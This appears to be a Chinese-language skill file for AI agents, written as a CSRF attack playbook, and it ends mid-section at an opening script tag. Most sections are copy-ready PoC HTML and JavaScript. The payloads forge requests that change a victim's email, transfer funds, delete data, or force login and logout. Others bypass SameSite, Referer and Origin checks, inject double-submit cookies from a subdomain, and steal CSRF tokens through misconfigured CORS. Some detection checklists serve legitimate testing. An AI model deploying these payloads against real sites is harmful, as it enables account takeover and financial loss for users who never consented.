---
name: csrf-testing
description: CSRF跨站请求伪造高级攻防专业技能：GET/POST/JSON/Flash/SOAP全请求类型、CSRF Token绕过矩阵、SameSite跨浏览器绕过(Lax+POST窗口/方法覆盖/CSWSH)、双提交Cookie绕过、CORS+CSRF链式利用与Token泄露、登录CSRF与OAuth授权码CSRF(账户劫持)、WebSocket/GraphQL/REST状态改变API、Service Worker劫持与缓存投毒、CSPT2CSRF、CSRF→账户接管→业务影响完整攻击链、AI大模型辅助PoC生成与Token校验逻辑审计
version: 3.0.0
---

# CSRF跨站请求伪造深度攻防测试技能

## 概述

CSRF（Cross-Site Request Forgery）利用浏览器自动携带Cookie的机制，诱导已登录用户执行非预期状态改变操作。现代防护体系包含 CSRF Token（Synchronizer Token / Double Submit / HMAC Cookie）、SameSite Cookie、Referer/Origin校验、自定义Header、CORS限制与新兴的 Fetch Metadata（Sec-Fetch-Site）与 CHIPS 分区Cookie。

本技能（v3.0.0）站在资深攻防专家视角，在保留 v2.0 全部核心内容（GET/POST/JSON/Flash/SOAP、Token绕过矩阵、SameSite绕过、CORS+CSRF链、Service Worker劫持）的基础上，新增：**登录CSRF与OAuth授权码CSRF（账户劫持级）、状态改变类API CSRF（WebSocket/GraphQL/REST PATCH/DELETE）、双提交Cookie绕过深化、Token位于Header但可通过CORS/JSONP泄露场景、Chrome/Firefox/Safari新SameSite语义差异、Service Worker/Cache poisoning实现的CSRF、CSPT2CSRF、CSRF→账户接管→业务影响完整攻击链、多步表单CSRF与Token传递、AI大模型辅助攻防**。全篇中文，Payload/PoC 可直接复制使用。

### 核心概念
- **CSRF三前提**：①受害者在目标站有活动会话（Cookie自动携带）②目标仅凭Cookie认证且CSRF防护缺失/可绕过 ③受害者访问攻击者可控页面
- **Site vs Origin**：SameSite 判定基于"site"（scheme+eTLD+1），CORS/SOP 基于"origin"（scheme+host+port）；子域之间是 same-site 但 cross-origin——这是大量链式攻击的根基
- **Synchronizer Token（同步令牌）**：Token存Session，表单/Header携带，服务端比对（有状态）
- **Double Submit（双提交）**：Token同时放Cookie与表单/Header，服务端只比对两者一致（无状态），存在Cookie注入/子域覆盖绕过面
- **SameSite**：`Strict`（跨站一律不携带）、`Lax`（跨站顶级导航GET携带，其余不携带）、`None`（必须配合Secure，全部携带）；无属性时现代浏览器默认视为Lax
- **Fetch Metadata（Sec-Fetch-Site/Dest/Mode/User）**：2023年起全部主流浏览器可用、JS不可伪造的请求上下文头，`.NET 11`、`Rails 8.2`、`Laravel 13`等框架已作为自动CSRF防护信号
- **第三方Cookie淘汰（2024-2026）**：Chrome逐步淘汰、Safari ITP强限制；`Partitioned`（CHIPS）Cookie把存储按顶级站点分区，改变CSRF的Cookie携带前提

### 2026防御现状速览（测试前提判断）
| 防御层 | 现状 | 对攻击者意义 |
|-------|------|-------------|
| SameSite默认Lax | Chrome 80+（2020）、Firefox 87+（2021）、Safari 16.4+ | 跨站POST默认不携带Cookie，但GET导航/2分钟窗口/方法覆盖可绕过 |
| Fetch Metadata | 2023起基线广泛可用，.NET 11已集成 | 服务端可拒绝`Sec-Fetch-Site: cross-site`，需寻找Header缺失/代理剥离场景 |
| 第三方Cookie淘汰 | Chrome 2025起逐步执行、Safari ITP | 依赖第三方Cookie的站点要么迁移，要么开SameSite=None（放大CSRF面） |
| CSRF Token | 仍是主流且有效 | 核心攻击目标：绕过校验或泄露Token |
| 双层防护 | Token+SameSite+CORS收敛 | 需组合链（XSS/CORS/子域/OAuth）逐个拆解 |

## 一、CSRF完整攻击面与威胁建模

### 1.1 敏感操作识别清单
| 操作类型 | 风险场景 | 攻击价值 |
|---------|---------|---------|
| 账户安全 | 修改密码/邮箱/手机号、绑定/解绑第三方账户、启用/禁用2FA、修改安全问题 | 高（直接接管前置） |
| 资金操作 | 转账、支付、充值、提现、购买、退款、改收款账户 | 极高（直接经济损失） |
| 权限变更 | 添加管理员、修改角色、授权API Key、邀请成员、改组织设置 | 极高（横向/垂直提权） |
| 数据操作 | 删除数据、修改内容、上传文件、发布内容、导出数据 | 高（完整性破坏+DoS） |
| 会话管理 | 注销（Logout CSRF）、登录（Login CSRF）、重置密码、会话固定 | 中-高（配合钓鱼/接管） |
| 配置变更 | Webhook、回调URL、重定向白名单、邮件转发规则、DNS/SPF记录 | 高（持久化+供应链） |
| 通知/社交 | 发送消息、评论、关注、邀请、点赞、关注攻击者账号 | 低-中（批量水军/钓鱼传播） |
| API操作 | GraphQL mutation、RESTful PUT/PATCH/DELETE、批量任务触发 | 中-高（取决于业务） |

### 1.2 请求类型与攻击难度矩阵
| 请求类型 | 攻击难度 | 典型Payload载体 | 现代浏览器注意点 |
|---------|---------|----------------|-----------------|
| GET | 低 | `<img>`/`<iframe>`/`<link>`/`meta refresh`/CSS背景 | Lax下顶级导航仍携带Cookie |
| POST urlencoded | 低 | 自动提交form | Lax下不携带Cookie（除非2分钟窗口） |
| POST multipart | 低 | form+`enctype=multipart/form-data` | 同上 |
| POST JSON | 中 | `enctype=text/plain`拼JSON、Flash、CORS | `application/json`触发预检，需特殊构造 |
| AJAX/Fetch（自定义Header） | 中-高 | CORS放行、Flash、SW劫持、DNS Rebinding | 预检拦截是主要障碍 |
| PUT/DELETE/PATCH | 中-高 | `_method`/`X-HTTP-Method-Override`、CORS | 方法覆盖是主要路径 |
| SOAP/XML | 中 | form+`text/plain`拼XML | 同JSON |
| WebSocket | 中-高 | `new WebSocket()`握手 | 握手GET无预检，SameSite决定Cookie |
| GraphQL | 中 | 见1.2请求类型 + mutation body | 通常JSON，同JSON CSRF |

### 1.3 CSRF攻击类型全景
- **常规CSRF**：以受害者身份执行任意操作
- **Login CSRF（登录CSRF）**：攻击者预置自己账户（已知密码），诱导受害者登录该账户，受害者在攻击者账户内输入的敏感信息（信用卡、身份证、收货地址）被攻击者掌握；或配合"登录后自动绑定"逻辑直接接管
- **Logout CSRF（注销CSRF）**：强制登出造成DoS，或配合钓鱼"重新登录"获取凭据；注意注销接口在Lax下GET导航可直接触发
- **OAuth授权码CSRF / 账户绑定CSRF**：state缺失/静态 → 受害者账户绑定攻击者第三方身份 → 攻击者反向登录受害者账户（账户劫持级，见第十章）
- **Flash/Silverlight CSRF**：跨域任意请求（含自定义Header与任意Content-Type），依赖`crossdomain.xml`错误配置
- **JSON CSRF**：绕过`application/json`的防护幻觉
- **CSRF+XSS**：XSS可读取Token、直接同源请求，使一切CSRF防护失效
- **CSRF+Open Redirect**：重定向使Referer显示同源
- **CSRF+CORS**：CORS错误配置→跨域读取Token→任意操作
- **CSRF+子域接管**：兄弟子域（sibling subdomain）接管→same-site上下文→绕过Strict/Lax
- **CSWSH（跨站WebSocket劫持）**：通过WebSocket信道执行状态改变
- **CSPT2CSRF（客户端路径穿越→CSRF）**：所有CSRF防护完备时仍可利用（见12.4节）
- **DoS via CSRF**：删除数据/改密/注销导致业务中断

## 二、检测方法论

### 2.1 Token机制识别
检查请求中的CSRF Token字段：
| Token位置 | 常见参数名 |
|---------|---------|
| 表单隐藏字段 | `csrf_token`、`_token`、`csrfmiddlewaretoken`、`authenticity_token`、`__RequestVerificationToken`、`csrf` |
| HTTP Header | `X-CSRF-Token`、`X-XSRF-Token`、`X-CSRF-TOKEN`、`X-Anti-CSRF-Token`、`Authorization`（误用场景） |
| Cookie | `XSRF-TOKEN`、`csrftoken`、`csrf-token`（Angular等框架自动从Cookie取值放入Header） |
| URL参数 | `?token=xxx`、`&_csrf=xxx`、`?state=xxx` |
| meta标签 | `<meta name="csrf-token" content="...">`（页面内嵌，可被CORS/JSONP读取） |

**Token有效性测试矩阵（进阶）：**
```
1. 删除Token → 是否拒绝？（应拒绝，接受=漏洞）
2. 替换为其他用户Token → 是否拒绝？（应拒绝，接受=Token未绑定用户）
3. 替换为其他会话Token → 是否拒绝？（应拒绝，接受=Token未绑定Session）
4. Token长度太短/全相同字符 → 是否拒绝？（长度校验缺陷）
5. Token仅校验格式（正则/长度）不校验值 → 等长任意值可过
6. Token可预测（时间戳+用户ID MD5、随机数种子固定、线性递增）
7. 空Token/空字符串是否通过？（部分框架`if(token)`判断缺陷）
8. Token在GET与POST中均可使用？（GET CSRF + Referer泄露面）
9. 把Token从Header移到Body、Body移到Cookie、Cookie移到GET参数是否仍通过？（校验位置绑定缺陷）
10. Token在OPTIONS/HEAD/GET请求中是否也校验？（方法条件校验，见5.4节）
```

### 2.2 Referer/Origin检测
```
1. 正常Referer: https://target.com/path → 通过
2. 删除Referer → 是否拒绝？（只校验"存在性"=可被no-referrer绕过）
3. Referer为空 → 是否通过？（data:/blob:/sandbox iframe Origin为null场景）
4. Referer为http://（降级） → 是否检查？
5. Referer为子域名 → 是否通过？（同站应通过）
6. Referer为target.com.attacker.com → 是否通过？（前缀/包含匹配缺陷）
7. Referer为attacker.com/target.com（路径含） → 是否通过？（包含匹配缺陷）
8. Referer为target.com@attacker.com → 是否通过？（@解析host为attacker.com）
9. Origin头为空/缺失时 → 是否通过？（仅当Origin存在时校验=伪造删除Origin）
10. Origin为null → 是否通过？（iframe sandbox/srcdoc/data: URL）
11. Origin与Host不匹配时是否拒绝？
```

### 2.3 SameSite Cookie检测
```
检查所有Set-Cookie头的SameSite属性：
- 无SameSite属性 → 现代浏览器默认Lax（Chrome 80+/Firefox 87+/Safari 16.4+），但老浏览器/APP内WebView可能是"无限制"
- SameSite=Strict → 跨站一律不携带，需同站Gadget/子域接管/SW绕过
- SameSite=Lax → 跨站顶级导航GET携带，POST/AJAX不携带；可被2分钟窗口/方法覆盖绕过
- SameSite=None → 必须Secure，所有请求携带=无防护，直接普通CSRF
同时检查：Domain属性是否为父域（父域Cookie可被子域页面携带）、Path是否为/、是否带__Host-/__Secure-前缀
```

### 2.4 自定义Header检测
- 依赖`X-Requested-With: XMLHttpRequest`（jQuery自动添加）：form提交不含此Header → 可作为校验信号；绕过见6.x/7.x
- 依赖`X-CSRF-Token` Header：跨站JS无法设置（触发预检），但CORS错误配置/Flash/SW劫持/DNS Rebinding可绕过
- 注意：**校验逻辑是否"Header存在即可"**（不校验值）——某些实现`if(req.headers['x-requested-with'])`即放行，`fetch`加任意值即可过

### 2.5 Fetch Metadata（Sec-Fetch-*）检测
```
2023起浏览器在请求中自动附加（JS不可伪造）：
- Sec-Fetch-Site: same-origin / same-site / cross-site / none
- Sec-Fetch-Mode: navigate / no-cors / cors / websocket
- Sec-Fetch-Dest: document / empty / image / iframe / json ...
- Sec-Fetch-User: ?1（顶级导航用户激活）

测试要点：
1. 目标是否校验Sec-Fetch-*？（现代框架如.NET 11自动拒绝cross-site+非安全方法）
2. 反向利用：旧浏览器/代理剥离/WebView/命令行工具（curl）不发送这些头 → 若服务端"缺失即放行"，可直接构造裸请求
3. 检查服务端是否对Sec-Fetch-Site: cross-site但Sec-Fetch-Mode: navigate（顶级导航）放行 → GET型CSRF仍有空间
```

## 三、基础利用技术（全请求类型）

### 3.1 GET请求CSRF
```html
<!-- 图像标签（自动加载，Lax下顶级子资源请求不携带Cookie——注意GET型漏洞需是顶级导航或同站） -->
<img src="https://target.com/api/delete?id=123" style="display:none">

<!-- 顶级导航GET（Lax默认允许携带Cookie，这是Lax下最核心的GET CSRF载体） -->
<a href="https://target.com/api/delete?id=123" id="cs"></a>
<script>document.getElementById('cs').click();</script>

<!-- window.open / location.href 同为顶级导航 -->
<script>window.open('https://target.com/logout');</script>

<!-- meta refresh（顶级导航） -->
<meta http-equiv="refresh" content="0;url=https://target.com/api/delete?id=123">

<!-- link prefetch（Chrome会在空闲时预取） -->
<link rel="prefetch" href="https://target.com/api/transfer?to=attacker&amount=10000">

<!-- CSS background（no-cors子资源，Lax下不携带Cookie，需目标无SameSite或None） -->
<style>body{background:url(https://target.com/api/delete?id=123)}</style>
```

### 3.2 POST表单CSRF（urlencoded）
```html
<!-- 自动提交表单 -->
<html><body>
<form id="csrf" action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="confirm" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>
</body></html>

<!-- 多参数+自动提交 -->
<form id="p" action="https://target.com/api/transfer" method="POST">
  <input type="hidden" name="account" value="attacker">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="currency" value="USD">
</form>
<script>document.p.submit();</script>
```

### 3.3 multipart/form-data CSRF（文件上传等场景）
```html
<form id="f" action="https://target.com/api/upload-avatar" method="POST" enctype="multipart/form-data">
  <!-- 浏览器不允许JS预填充file input；但若上传接口接受filename以外的字段即可直接攻击 -->
  <input type="text" name="description" value="pwned">
</form>
<script>document.f.submit();</script>
<!-- 注：攻击者无法用纯HTML伪造文件内容（需用户交互或XSS），但"上传配置/覆盖已存在文件"类接口若接受URL参数则不受此限 -->
```

### 3.4 JSON CSRF
```html
<!-- 方法1：enctype=text/plain（服务器容忍时，不触发预检，跨站POST可带表单体） -->
<form action="https://target.com/api/update-profile" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
<!-- 实际提交body: {"email":"attacker@evil.com","x":"="} -->
<!-- 变体：服务器若不校验Content-Type只解析body，可构造合法JSON -->

<!-- 方法2：JSON前加前缀绕过（XSSI防御反噬） -->
<!-- 若服务端JSON解析器容忍 `)]}'\n` 等前缀（Spring/部分老框架），可配合text/plain提交 -->

<!-- 方法3：Flash/Silverlight跨域请求（老浏览器，依赖crossdomain.xml允许*） -->
<object type="application/x-shockwave-flash" data="csrf.swf">
  <param name="flashvars" value="url=https://target.com/api&json={...}">
</object>

<!-- 方法4：CORS错误配置（见第九章）-->

<!-- 方法5：表单+FormData跨域（fetch的no-cors会剥离自定义头，仅限无头校验接口） -->
```

### 3.5 PUT/DELETE/PATCH方法覆盖
```html
<!-- 隐藏方法参数（Spring/Rails/Laravel/Symfony/Express常见） -->
<form action="https://target.com/api/user/123" method="POST">
  <input type="hidden" name="_method" value="DELETE">
</form>
<script>document.forms[0].submit();</script>

<!-- 另见6.x：_method=GET绕过Lax与"仅校验POST"逻辑的复合攻击 -->
```
`X-HTTP-Method-Override`、`X-Method-Override` Header 通过纯form无法发送，需CORS/Flash/SW。

### 3.6 Login CSRF
```html
<!-- 攻击者已知账户密码，诱导受害者登录攻击者账户 -->
<form action="https://target.com/login" method="POST" id="f">
  <input type="hidden" name="username" value="attacker_acct">
  <input type="hidden" name="password" value="attacker_pwd">
</form>
<script>document.f.submit();</script>
<!-- 危害：受害者在攻击者账户内输入信用卡/个人隐私 → 攻击者可查 -->
<!-- 注意：登录接口通常无CSRF Token（自己实现或OAuth），成功率极高 -->
```
**进阶（会话固定变体）：**
```
若登录后服务端"沿用已有session id"（未轮换），攻击者先取得一个合法session id并预置到受害者Cookie（子域/CRLF注入），受害者登录后该session变为认证态，攻击者直接使用 → 无需受害者输入任何敏感信息即可接管
```

### 3.7 Logout CSRF
```html
<!-- 强制登出（DoS）或配合钓鱼 -->
<img src="https://target.com/logout">
<a href="https://target.com/logout" id="l"></a><script>l.click()</script>
<!-- 现代浏览器Lax下GET顶级导航可携带Cookie，注销接口基本必中 -->
<!-- 链式价值：受害者做敏感操作时被登出→诱导重新登录→密码/凭据钓鱼 -->
```

### 3.8 SOAP/XML CSRF
```html
<form action="https://target.com/soap/service" method="POST" enctype="text/plain">
  <input name='<?xml version="1.0"?><soap:Envelope><soap:Body><ResetPassword><email>attacker@evil.com</email></ResetPassword></soap:Body></soap:Envelope><!--' value='-->'>
</form>
<script>document.forms[0].submit();</script>
```

### 3.9 iframe sandbox + null Origin绕过
```html
<!-- iframe sandbox时Origin为null；若后端接受Origin:null则绕过Origin校验 -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<form action='https://target.com/api/action' method='POST'>
<input type='hidden' name='x' value='y'>
</form>
<script>document.forms[0].submit();</script>
"></iframe>
<!-- 变体：<iframe sandbox="allow-forms"> 无allow-scripts也可提交表单 -->
```

## 四、CSRF Token绕过矩阵（深化）

### 4.1 Token验证方式与绕过对照表

| Token验证方式 | 绕过方法 | 实战优先级 |
|-------------|---------|-----------|
| 仅检查Token存在性 | 发送任意值 | ★★★★★ |
| Token可预测（时间戳/ID/MD5/固定随机源） | 预测/重放历史值 | ★★★★ |
| Token绑定Cookie但未绑定Session | 同时设置Cookie与表单Token（双提交缺陷）| ★★★★★ |
| Token绑定Cookie且绑定Session但未绑定User | 用自己的Token替换 | ★★★ |
| Token可重复使用（未一次性失效） | 捕获后重用 | ★★★★ |
| Token仅在Cookie中 | Cookie注入覆盖（子域/CRLF/Tossing）| ★★★★ |
| Token在GET参数/URL | 直接GET CSRF+Referer泄露 | ★★★★ |
| Token通过AJAX Header发送但CORS放行 | CORS读取Token（第九章） | ★★★★ |
| 空Token通过 | 删除Token字段 | ★★★★ |
| 仅校验Token长度/格式 | 等长任意值 | ★★★★ |
| 仅校验Token签名前半段/前缀 | 截断/前缀伪造 | ★★★ |
| Token校验仅针对POST方法 | HEAD/OPTIONS/GET/方法覆盖绕过（5.4节） | ★★★★ |
| Token校验仅针对特定Content-Type | 换Content-Type绕过 | ★★★ |
| Token在多步流程中仅首步校验 | 直接跳转后步（5.5节） | ★★★★ |

### 4.2 Token泄露通道全景
```
1. XSS漏洞 → 直接读取Token（meta/DOM/接口响应）
2. CORS错误配置 → 跨域fetch读取Token（第九章9.1）
3. JSONP接口泄露Token（callback参数包裹Token响应）
4. Token在URL中 → Referer/日志/历史记录泄露
5. 302重定向链 → Token随Location头/Referer外泄
6. 错误页面/调试接口回显Token
7. 统计/埋点接口（前端上报页面HTML含meta token）
8. Service Worker劫持 → 截获请求头中的Token（第十二章）
9. 共享缓存/CDN缓存差异 → 缓存投毒读取带Token页面
10. 子域页面（父域Cookie+同站token读取接口）→ 通过CORS或同站上下文读取
```

### 4.3 Token绑定的三重校验维度（审计要点）
```
高级审计时对Token逐项验证"绑定维度"：
A. 是否绑定Session？（换Session验证）
B. 是否绑定User？（换用户Token验证）
C. 是否绑定请求方法/路径？（换方法/路径验证）
D. 是否一次性？（重放验证）
E. 熵是否足够/随机源是否安全？（统计采集1000个样本分析）
任意一项"否"即存在对应绕过面，组合多项缺陷可形成完整利用链
```

### 4.4 双提交Token Cookie边界场景
```
场景A：表单Token=从Cookie读取 → 服务端仅比对"Cookie中Token==表单Token"
  → 若攻击者可设置目标域Cookie（子域接管/CRLF注入/Cookie Tossing/HTTP与HTTPS混用），即可注入攻击者已知值
场景B：Angular风格（XSRF-TOKEN Cookie + X-XSRF-Token Header）
  → 前端JS自动从Cookie读值放Header；攻击者先注入已知Cookie值 → 浏览器自动带正确Header → 绕过
场景C：Token=HMAC(CookieToken, 服务端密钥)
  → 需密钥；若HMAC验证存在"长度差异攻击/算法混淆/时序"缺陷则可绕过（见8.3节）
```

### 4.5 多步表单CSRF与Token传递（新增）
```
多步业务流程（注册→验证→完善资料、改密→确认→完成、购物车→结算→支付确认）的Token薄弱点：
1. 仅第一步校验Token，后续步骤只校验Session → 直接构造后步请求
2. Token在步骤间通过URL参数传递 → Referer/日志泄露+GET CSRF
3. Token存于hidden域但页面间可被预测/固定
4. 各步Token独立但共享同一Session且可被"重放前步Token"
5. 步骤回退/跳转（直接POST到第N步）绕过中间校验

实战Payload（跳过中间步骤直达状态改变步骤）：
<form action="https://target.com/checkout/step3-confirm" method="POST">
  <input type="hidden" name="order_id" value="12345">
  <input type="hidden" name="confirm" value="1">
</form>
<script>document.forms[0].submit();</script>
<!-- 若step3仅依赖Session中的order上下文且不校验Token → 直接生效 -->

多步自动推进（iframe依次提交各步）：
<iframe name="f1" style="display:none"></iframe>
<iframe name="f2" style="display:none"></iframe>
<form action="https://target.com/flow/step1" method="POST" target="f1">
  <input type="hidden" name="a" value="1">
</form>
<!-- 若服务端把步骤状态存Session，攻击者构造step1→step2→step3连续提交 -->
```

## 五、SameSite Cookie语义与跨浏览器绕过

### 5.1 Site判定与浏览器语义差异（2026现状）
```
"Site" = scheme + eTLD+1（公共后缀+一级），与端口/子域无关
- https://app.example.com → https://api.example.com = same-site
- https://example.com → http://example.com = cross-site（scheme不同）
- 无SameSite属性默认Lax：
  Chrome/Edge 80+（2020-02）、Firefox 87+（2021-04）、Safari 16.4+（2023-03）
  Chrome on iOS 用WebKit不强制新默认；APP内WebView/老浏览器无默认限制
- Safari ITP：第三方Cookie默认封禁+7天清除，SameSite=None Cookie在Safari也受限（需CAPTCHA/Storage Access API）
```
**跨浏览器差异是攻击者的机会窗：** 同一PoC在Chrome失败、在Firefox/老浏览器/WebView可能成功，务必多浏览器验证。

### 5.2 SameSite=Lax绕过
```javascript
// 1. GET型操作顶级导航（Lax允许）：改GET、或接受GET+body
window.open('https://target.com/api/delete?id=123');
location.href = 'https://target.com/api/delete?id=123';

// 2. Lax+POST 2分钟窗口（Chrome专用，最高价值）
// 机制：若Cookie是"最近（≤2分钟）跨站POST响应中设置"的，Lax会额外放行一次跨站POST
// 利用：先用跨站POST让目标Set-Cookie（如搜索/登录/埋点接口反射写入cookie），
//       2分钟内立即发起CSRF POST → Cookie被携带
// 第一步（跨站form，诱导目标写入cookie）：
//   POST https://target.com/login → 响应Set-Cookie: session=xxx; SameSite=Lax
// 第二步（2分钟窗口内的CSRF POST）：
//   form自动提交到敏感接口 → Lax例外放行携带Cookie

// 3. 方法覆盖（_method=GET，6.x详述）：浏览器发POST（Lax阻止），路由层视为GET
//    Symfony/Laravel/Express/Rails 常见 `_method` 隐藏参数

// 4. 同站Gadget（Strict/Lax通用最强绕过）：找到同站任意JS执行点
//    - 同站XSS / DOM open redirect（客户端重定向构造目标URL，被视为普通请求而非导航）
//    - 子域名XSS（cookie Domain=父域时）
//    - JSONP回调（同站可执行攻击者控制JS的接口）
//    - 子域接管（sibling subdomain takeover：DNS挂靠/悬空记录）
//    PortSwigger经典思路：同站DOM型open redirect作为Gadget，让浏览器发"普通同站请求"

// 5. Cookie注入覆盖（不阻止Set-Cookie）：
//    把受害者Session覆盖为攻击者已知会话 → CSRF操作使用攻击者会话（=Login CSRF变体）

// 6. 跨站WebSocket握手（CSWSH，见11.1节）：WS握手GET在部分实现/旧浏览器不受SameSite限制
```

### 5.3 SameSite=Strict绕过
```javascript
// Strict下任何跨站请求不携带Cookie，需破坏"跨站"前提：
// 1. 同站Gadget：子域XSS/JSONP/DOM open redirect（5.2-4）
// 2. 子域接管后成为"同站"来源
// 3. Service Worker劫持（Chromium issue 429585229：SW拦截fetch()转发时Strict/Lax Cookie被不当包含）
// 4. 点击劫持组合：诱导用户在已打开的target.com页面内点击（同站触发）
// 5. 老浏览器/WebView不执行Strict语义
// 6. 若登录态在非Cookie载体（Authorization Header/Web Storage+JS请求）→ SameSite完全无效，直接CSRF其API
```

### 5.4 方法条件校验绕过（POST-only token检查）
```
大量框架/自研代码只对POST校验Token（GET留给读操作）：
1. _method=GET：form提交_method=GET，路由层当GET处理 → Token校验被跳过
   <form action="https://target.com/api/change-email" method="POST">
     <input type="hidden" name="_method" value="GET">
     <input type="hidden" name="email" value="attacker@evil.com">
   </form>
2. HEAD-as-GET：后端把HEAD路由到GET handler（无Token校验），HEAD跨站可发
   <img src="https://target.com/api/change-email?email=attacker@evil.com">
   // 某些框架接受HEAD作为GET的响应头模式——若操作副作用在GET handler内则生效
3. 用OPTIONS/TRACE探路：若OPTIONS也执行handler副作用（罕见）
4. 直接改GET：`POST /api/x` → `GET /api/x?params...`，Token校验仅绑定POST即失效
```

### 5.5 SameSite=None与Partitioned（CHIPS）
```
- SameSite=None必须Secure：站点若为兼容第三方把认证Cookie设为None → 全部跨站请求携带 → 普通CSRF全通，优先级最高先测
- Partitioned Cookie（CHIPS）：分区存储，第三方嵌入场景不携带——主要影响"嵌入iframe内的第三方服务"
  测试：若目标把认证Cookie标记为Partitioned，则攻击者站内嵌iframe发起的跨站请求不携带该Cookie（天然防CSRF），需转向顶级导航/同站Gadget
```

## 六、Referer/Origin校验绕过

### 6.1 无Referer/空Referer绕过
```html
<!-- meta referrer=no-referrer -->
<meta name="referrer" content="no-referrer">
<a href="https://target.com/api/delete?id=123" id="x">click</a>
<script>document.getElementById('x').click();</script>

<!-- Referrer-Policy响应头策略由目标决定；攻击者页面可自控meta -->
<!-- data:/blob: URL、iframe sandbox、srcdoc发送请求通常无Referer -->
<iframe src="data:text/html,<form action='https://target.com/api/delete' method='POST'>...</form>"></iframe>
<!-- 若服务端"Referer缺失即放行" → 直接绕过 -->
```

### 6.2 Referer包含匹配绕过（弱正则）
```
校验逻辑若为 contains("target.com") / startsWith("https://target.com") / regex 误写：
1. https://target.com.attacker.com          → 子域包含
2. https://attacker.com/target.com          → 路径包含
3. https://attacker.com?u=https://target.com → 查询参数包含
4. https://attacker.com#target.com          → hash包含
5. https://target.com@attacker.com          → @前为userinfo，host是attacker.com
6. https://target.com.evil.com              → 前缀匹配
7. https://target.comm.attacker.com         → 前缀+后缀字符
8. IDN同形字（homograph）：punycode校验与显示不一致
```

### 6.3 Open Redirect联动（Referer显示同源）
```
1. 目标有open redirect: https://target.com/redirect?url=<attacker>
2. 构造CSRF：先访问 https://target.com/redirect?url=https://target.com/api/delete
   中间跳转请求的Referer为target.com（同源）→ 通过校验
3. 若redirect白名单宽松（允许任意URL），甚至可直接链到攻击者页面保持Referer为target.com
注意：现代浏览器Referer默认发送"源+路径"（strict-origin-when-cross-origin），跨源跳转时Referer可能被裁剪为仅源——需实测
```

### 6.4 Origin校验绕过
```
1. Origin: null（iframe sandbox/srcdoc/data:）→ 服务端白名单null则直接过
2. 删除Origin头（旧浏览器/代理/curl）→ "缺失即放行"缺陷
3. Origin反射：服务端把Origin原样放入ACAO（CORS缺陷联动，见第九章）
4. 多Origin头/大小写/尾斜杠/端口差异处理缺陷
5. 校验用Origin判断但跨域请求中Origin为`https://target.com.attacker.com`时的正则缺陷（同6.2）
```

## 七、双提交Cookie绕过与Cookie注入

### 7.1 双提交（Double Submit）机制剖析
```
原理（无状态）：页面签发Token时同时写入Cookie与表单/Header，服务端只比对两者是否一致，不查Session
安全性取决于：攻击者能否让受害者的Cookie==攻击者提供的表单Token
```

### 7.2 Cookie注入路径矩阵
| 注入方式 | 条件 | 效果 |
|---------|------|------|
| 子域Cookie注入 | 目标存在攻击者可控子域（接管/XSS/托管） | 以父域Domain写任意Cookie值 |
| Cookie Tossing | 子路径可写Cookie（Path=/）覆盖主域同名Cookie | 同名覆盖（主域优先规则/路径优先规则差异利用） |
| CRLF注入（Set-Cookie） | 响应头可注入`\r\nSet-Cookie:...` | 直接写任意Cookie |
| XSS设置Cookie | 任意XSS | document.cookie（HttpOnly除外） |
| HTTP/HTTPS混写 | HTTP与HTTPS分别存Cookie（Secure差异） | HTTP侧写入→HTTPS读取 |
| 开放重定向+登录接口 | 登录接口可被CSRF驱动且写入可预测Cookie | 与Lax+POST窗口联动 |
| 307重定向跨域 | 服务端307保留POST数据到跨域 | 触发目标写Cookie |

### 7.3 子域Cookie注入实战Payload
```html
<!-- 若攻击者控制 sub.target.com（XSS或托管），注入父域Cookie： -->
<!-- 在sub.target.com页面执行： -->
<script>
document.cookie = "csrf_token=ATTACKER_KNOWN; Domain=.target.com; Path=/";
</script>
<!-- 然后在攻击者站提交表单：csrf_token=ATTACKER_KNOWN（Cookie与表单一致→通过） -->
<form action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf_token" value="ATTACKER_KNOWN">
</form>
<script>document.forms[0].submit();</script>
```

### 7.4 Cookie Tossing（子路径覆盖）
```
浏览器同名Cookie匹配规则：路径越具体优先、Domain越精确优先
攻击手法：在攻击者页面/子域触发 https://target.com/attackerpath 下的Set-Cookie（Path=/），
若目标存在"未认证即可写cookie"的接口（如跟踪/AB测试/埋点），可覆盖同名的认证CSRF Cookie
再配合表单提交同值Token → 绕过
```

### 7.5 签名双提交（HMAC）绕过
```
若实现为 Token = HMAC(密钥, CookieToken) 且表单同时提交CookieToken与签名：
1. 长度扩展攻击（HMAC-SHA1/256使用不当拼接时）
2. 算法混淆（alg字段可改，如"HS256"→"none"或降级）
3. 签名仅校验前缀/正则
4. 时间戳重放（签名内嵌时间未校验新鲜度）
5. 服务端未把CookieToken纳入校验（仅比对签名字符串）
最有效防御与利用分界：__Host-CSRF-TOKEN前缀（禁止Domain，子域无法注入）+ 密钥签名 + 一次性
```

## 八、CORS+CSRF链式利用与Token泄露通道

### 8.1 CORS错误配置读取Token
```
前提：目标响应含以下任一配置
- Access-Control-Allow-Origin: <反射Origin> + Access-Control-Allow-Credentials: true
- Access-Control-Allow-Origin: * （无凭据场景，读公开Token）
- Access-Control-Allow-Origin: null
- 正则缺陷（含子域通配过宽）

利用（读取页面meta token或接口响应）：
fetch('https://target.com/profile', {credentials:'include'})
  .then(r => r.text()).then(t => {
    // 提取meta csrf-token 或响应中的token
    var token = t.match(/name="csrf-token" content="([^"]+)"/)[1];
    // 发送带token的请求
    fetch('https://target.com/api/change-email', {
      method:'POST', credentials:'include',
      headers:{'Content-Type':'application/json','X-CSRF-Token':token},
      body: JSON.stringify({email:'attacker@evil.com'})
    });
  });
```

### 8.2 Token在Header但可通过CORS/JSONP泄露的场景
```
场景1：Token放Header（X-CSRF-Token），但页面含<meta csrf-token>且CORS放行 → 读meta
场景2：Token放Header，但存在JSONP接口返回token（callback=fn包裹）→ <script src>跨域加载
场景3：Token放Header，但错误响应/401响应体回显（CORS读取错误体）
场景4：Angular/Spring风格——Token在XSRF-TOKEN Cookie（非HttpOnly）：
       攻击者站点无法直接读跨域Cookie，但若攻击者可注入Cookie（第七章）→ 浏览器自动同步Header
场景5：CORS放行+页面存在embedding token的API（/api/csrf、/api/session返回token）→ 直接fetch读

JSONP泄露Payload：
<script>
